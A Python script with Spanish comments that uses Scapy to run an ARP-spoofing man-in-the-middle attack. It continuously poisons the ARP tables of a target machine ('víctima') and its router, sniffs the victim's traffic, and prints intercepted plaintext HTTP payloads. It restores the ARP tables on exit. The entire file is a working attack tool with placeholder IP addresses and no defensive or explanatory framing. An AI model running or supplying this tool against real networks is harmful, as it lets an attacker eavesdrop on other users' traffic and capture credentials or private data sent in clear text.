from scapy.all import ARP, Ether, srp, send, sniff, TCP, IP, Raw
import time

# Configuración
victim_ip = "192.168..."   # IP de la víctima
gateway_ip = "192.168...." # IP del router

def get_mac(ip):
    """Obtiene la MAC de una IP mediante ARP request"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered, _ = srp(packet, timeout=2, verbose=False)
    
    if answered:
        return answered[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip, target_mac):
    """Envia un ARP falso para hacer spoofing"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    """Restaura las tablas ARP con la información real"""
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def packet_callback(packet):
    """Procesa los paquetes sniffados"""
    if packet.haslayer(TCP) and packet.haslayer(Raw):  
        payload = packet[Raw].load
        if packet[TCP].dport == 80 or packet[TCP].sport == 80:  # HTTP
            try:
                print("\n[HTTP] Paquete interceptado:")
                print(payload.decode(errors="ignore"))  # Mostramos el contenido
            except:
                pass
        elif packet[TCP].dport == 443 or packet[TCP].sport == 443:  # HTTPS
            print("[HTTPS] Paquete interceptado (cifrado).")

if __name__ == "__main__":
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if victim_mac is None or gateway_mac is None:
        print("[!] No se pudo obtener alguna MAC. Abortando...")
        exit()

    print(f"[+] MAC de la víctima ({victim_ip}): {victim_mac}")
    print(f"[+] MAC del router ({gateway_ip}): {gateway_mac}")

    try:
        print("[*] Iniciando ataque MITM + Sniffing...")

        # Lanzamos el ataque envenenando constantemente las tablas ARP
        while True:
            spoof(victim_ip, gateway_ip, victim_mac)
            spoof(gateway_ip, victim_ip, gateway_mac)

            # Sniff por 5 paquetes (puedes ajustar el count o quitarlo para infinito)
            sniff(filter=f"ip host {victim_ip}", prn=packet_callback, count=5, store=False)

            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restaurando ARP y saliendo...")
        restore(victim_ip, gateway_ip, victim_mac, gateway_mac)
        restore(gateway_ip, victim_ip, gateway_mac, victim_mac)

    
        